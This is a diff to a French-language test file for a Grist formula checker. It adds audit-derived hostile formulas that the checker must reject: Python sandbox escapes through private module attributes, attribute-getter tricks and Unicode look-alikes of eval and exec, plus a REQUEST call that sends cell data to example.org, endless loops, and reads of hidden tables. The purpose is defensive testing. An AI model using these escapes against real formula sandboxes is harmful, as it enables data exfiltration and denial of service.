@@ -270,6 +270,64 @@ test('formules : ce qui empêche de poser une formule', () => {
   assert.deepEqual(problems('Villes.lookupOne(Nom=$Libelle).Nom'), ['renamedTable:Villes>Cities']);
 });
 
+test('formules : les contournements trouvés à l\'audit de la 0.30.4 sont refusés', () => {
+  const every = new Set(['Budget', 'Villes', 'Cities', 'Secrets', 'Journal_Annuaire', 'Secrets_summary_Dept']);
+  const read = (formula, extra = {}) => problems(formula, { every, ...extra });
+  // Noms privés des modules permis : `random._os` et `collections._sys` ne contiennent aucun mot de la liste.
+  assert.deepEqual(read('import random\nreturn random._os.listdir("/")'), ['unsafe:_os']);
+  assert.deepEqual(read('import collections\nreturn collections._sys.modules'), ['unsafe:_sys']);
+  assert.deepEqual(read('$Libelle._secret'), ['unsafe:_secret'], 'un nom privé après une colonne citée aussi');
+  assert.deepEqual(read('[$Montant for _ in range(3)]'), [], '`_` seul (boucle sans valeur) et `1_000` restent permis');
+  assert.deepEqual(read('$Montant * 1_000'), []);
+  // Modules que les modules permis laissent atteindre, et lecteurs d'attributs par leur nom.
+  assert.deepEqual(read('import fractions\nreturn fractions.operator.attrgetter("real")($Montant)'), ['unsafe:operator', 'unsafe:attrgetter', 'import:fractions']);
+  assert.deepEqual(read('import string\nreturn string.Formatter().get_field("0.real", [$Montant], {})[0]'), ['unsafe:Formatter', 'unsafe:get_field', 'import:string']);
+  assert.deepEqual(read('import re\nreturn re.enum.bltns.vars'), ['unsafe:enum', 'unsafe:bltns', 'unsafe:vars']);
+  assert.deepEqual(read('import json\nreturn json.codecs.open'), ['unsafe:codecs', 'unsafe:open']);
+  assert.deepEqual(read('import functools\nreturn functools.partial(len)($Libelle)'), [], 'functools, collections, itertools, json, re, math, datetime restent permis');
+  assert.deepEqual(read('import datetime\nreturn datetime.datetime.strptime($Libelle, "%Y")'), []);
+  // La fonction REQUEST de Grist envoie une requête à n'importe quelle adresse (si l'instance l'a activée) : exfiltration.
+  assert.deepEqual(read('REQUEST("https://example.org/?d=" + str($Montant)).content'), ['unsafe:REQUEST']);
+  assert.deepEqual(read('grist.engine'), ['unsafe:grist', 'unsafe:engine'], 'l\'intérieur de Grist');
+  // Ce qui bloque le calcul de tout le document.
+  assert.deepEqual(read('while True:\n    pass'), ['unsafe:while']);
+  assert.deepEqual(read('import time\ntime.sleep(1e9)'), ['unsafe:sleep']);
+  assert.deepEqual(read('exit()'), ['unsafe:exit']);
+  // Python normalise les identifiants (NFKC) : « ｅｖａｌ » en pleine largeur est `eval`.
+  assert.deepEqual(read('ｅｖａｌ("1")'), ['unsafe:ｅｖａｌ', 'unsafe:eval']);
+  assert.deepEqual(read('𝐞𝐱𝐞𝐜("1")'), ['unsafe:𝐞𝐱𝐞𝐜', 'unsafe:exec']);
+  assert.deepEqual(read('$Libelle == "Éléphant"'), [], 'un texte peut porter des accents');
+  // Tables d'ici qui ne sont pas dans l'export : toute façon de les lire, y compris les résumés et les journaux.
+  assert.deepEqual(read('Secrets.lookup_records(Nom=$Libelle)'), ['foreignTable:Secrets']);
+  assert.deepEqual(read('Secrets.lookup_one_record(id=1).Nom'), ['foreignTable:Secrets']);
+  assert.deepEqual(read('len(Secrets)'), ['foreignTable:Secrets']);
+  assert.deepEqual(read('[r.Nom for r in Secrets_summary_Dept.all]'), ['foreignTable:Secrets_summary_Dept']);
+  assert.deepEqual(read('Journal_Annuaire.all'), ['foreignTable:Journal_Annuaire']);
+  assert.deepEqual(read('len(Villes)'), ['renamedTable:Villes>Cities'], 'une table de l\'export qui change de nom est dite même citée seule');
+  assert.deepEqual(read('len(Budget.lookupRecords(Secrets=$Montant))'), [], 'un nom d\'argument ou de colonne n\'est pas une table');
+  assert.deepEqual(read('$Secrets + rec.Secrets'), ['missingCol:Secrets'], 'une colonne qui porte le nom d\'une table n\'est pas une table');
+  assert.deepEqual(read('import unicodedata\nreturn unicodedata.lookup("LATIN SMALL LETTER A")'), [], 'un module qui a une méthode lookup n\'est pas une table');
+  // Les colonnes citées ne sont pas des mots de code : `$open` est une colonne.
+  const withOpen = new Map([...here, ['open', {}], ['input', {}]]);
+  assert.deepEqual(formulaProblems('$open + rec.input', { here: withOpen, map: {}, tables }).map(p => p.code), []);
+});
+
+test('formules : les formules usuelles de Grist passent la lecture', () => {
+  const columns = new Map(['Prix', 'Quantite', 'Nom', 'Prenom', 'Date', 'Statut', 'Ville', 'Montant', 'Email', 'Notes', 'Tags', 'Engine', 'Help', 'Exit'].map(c => [c, {}]));
+  const every = new Set(['Budget', 'Journal_x', 'Autre']);
+  const usual = [
+    '$Prix * $Quantite', '"{:.2f} €".format($Montant)', 'f"{$Prenom} {$Nom.upper()}"', 'IF($Statut == "open", "Ouvert", "Fermé")',
+    'SUM(r.Montant for r in Budget.lookupRecords(Ville=$Ville))', 'len(Budget.lookupRecords(Ville=$Ville))', 'Budget.lookupOne(Nom=$Nom).Montant',
+    'TODAY() - $Date', 'DATEADD($Date, months=1)', '$Date.strftime("%d/%m/%Y") if $Date else ""',
+    'import datetime\nreturn (datetime.date.today() - $Date).days', 'import re\nreturn re.sub(r"\\s+", " ", $Notes).strip()',
+    'REGEXREPLACE($Notes, "[0-9]+", "#")', '", ".join(sorted(set($Tags)))', '[t.strip() for t in $Notes.split(",") if t]',
+    '$Email.lower().split("@")[1] if "@" in $Email else None', 'import math\nreturn math.ceil($Montant / 10)',
+    'import json\nreturn json.dumps({"nom": $Nom, "montant": $Montant})', 'PEEK($Montant)', 'UUID()', 'NOW()', '$Engine + $Help + $Exit',
+    'total = 0\nfor r in Budget.all:\n    total += r.Montant\nreturn total', 'import collections\nreturn collections.Counter($Tags).most_common(1)',
+  ];
+  for (const formula of usual) assert.deepEqual(formulaProblems(formula, { here: columns, map: {}, tables: new Map([['Budget', 'Budget']]), every }), [], formula);
+});
+
 test('formules : plan d\'écriture', () => {
   const schema = {
     columns: () => [
